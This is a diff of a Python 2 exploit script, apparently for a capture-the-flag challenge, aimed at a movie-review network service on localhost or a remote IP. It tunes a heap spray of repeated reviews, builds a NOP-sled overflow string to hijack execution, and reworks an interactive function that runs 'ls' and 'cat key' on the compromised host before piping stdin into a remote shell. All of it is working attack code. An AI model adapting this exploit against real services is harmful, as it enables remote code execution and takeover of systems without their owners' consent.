@@ -20,13 +20,14 @@ if LOCAL:
     HOST = "localhost"
     PORT = "55000"
     SLEEP_TIME = 0
-    MAX_ENTRIES = 8000
+    #MAX_ENTRIES = 8000
     #MAX_ENTRIES = 16384
 else:
     HOST = "54.215.5.83"
     PORT = "3036"
     SLEEP_TIME = 0
-    MAX_ENTRIES = 8000
+    #MAX_ENTRIES = 8000
+    MAX_ENTRIES = 16384
 
 NOP = "\x90"
 HEAP_ADDRESS = "\x09\x45\xc0\x08"
@@ -79,7 +80,7 @@ def connect():
 def clear_read_buffer(con):
     r = con.read_one(0)
     while len(r) > 0:
-        print r
+        #print r
         r = con.read_one(0)
 
 ################################################################################
@@ -148,10 +149,11 @@ def review_movie(title, review, con):
     time.sleep(SLEEP_TIME)
 
     # Read the response
-    resp = con.read_line()
+    #resp = con.read_line()
 
     # Did we delete the movie?
-    return "Reviewed!" in resp
+    #return "Reviewed!" in resp
+    return True
 
 ################################################################################
 #
@@ -185,40 +187,13 @@ def send_movie(movie,con):
 
 ################################################################################
 #
-#   go_interactive
-#
-#   Switches to an interactive mode, good for shells maybe
-#   You can't get out of interactive mode
-#
-################################################################################
-def go_interactive(con):
-
-
-    con.write("ls\n")
-    time.sleep(1)
-    resp = con.read_one(0)
-    print resp
-    if not resp:
-        return False
-
-    con.write("cat key\n")
-
-    print "\aSuccess! Attempts: " + `attempts`
-    print "Entering interactive mode:"
-
-    while True:
-        time.sleep(1)
-        print con.read_one(0)
-        con.write(sys.stdin.readline())
-
-################################################################################
-#
 #   hijack_execution
 #
 ################################################################################
 def hijack_execution(con):
 
-    #time.sleep(5)
+    time.sleep(5)
+    #clear_read_buffer(con)
 
     # Setup overflow string
     overflow_string = ""
@@ -240,6 +215,8 @@ def hijack_execution(con):
 
     if DEBUG:
         pause_script_msg("Press Enter to Pwn")
+
+    #clear_read_buffer(con)
     
     # Send the "movie title"
     con.send_line(overflow_string)
@@ -257,6 +234,55 @@ def hijack_execution(con):
 
     #return resp
 
+################################################################################
+#
+#   go_interactive
+#
+#   Switches to an interactive mode, good for shells maybe
+#   You can't get out of interactive mode
+#
+################################################################################
+def go_interactive(con):
+
+
+    con.write("ls\n")
+    time.sleep(15)
+    clear_read_buffer(con)
+    resp = con.read_one(0)
+    #print resp
+    #if not resp:
+    #    return False
+    try:
+        con.read_line()
+    except conerror:
+        return False
+    except IOError, e:
+        return False
+
+
+
+
+    con.write("ls\n")
+    time.sleep(1)
+    resp = con.read_one(0)
+    print resp
+    con.write("cat key\n")
+    resp = con.read_one(0)
+    print resp
+
+    print "\aSuccess! Attempts: " + `attempts`
+    print "Entering interactive mode:"
+    #clear_read_buffer(con)
+
+    while True:
+        time.sleep(1)
+        print con.read_one(0)
+        try:
+            con.write(sys.stdin.readline())
+        except IOError, e:
+            return False
+
+
 
 ################################################################################
 #
@@ -270,7 +296,6 @@ def build_nop_string(size):
         nop_string += NOP
 
     return nop_string
-
 ################################################################################
 #
 #   build_string
@@ -435,9 +460,9 @@ while True:
     print "Sending reviews:"
     for i in range(0, MAX_ENTRIES):
         review_movie(title, review, con)
-        print(`i` + "..."),
-        if ((i + 1) % 10 == 0):
-            print ""
+        #print(`i` + "..."),
+        #if ((i + 1) % 10 == 0):
+            #print ""
 
     hijack_execution(con)
 
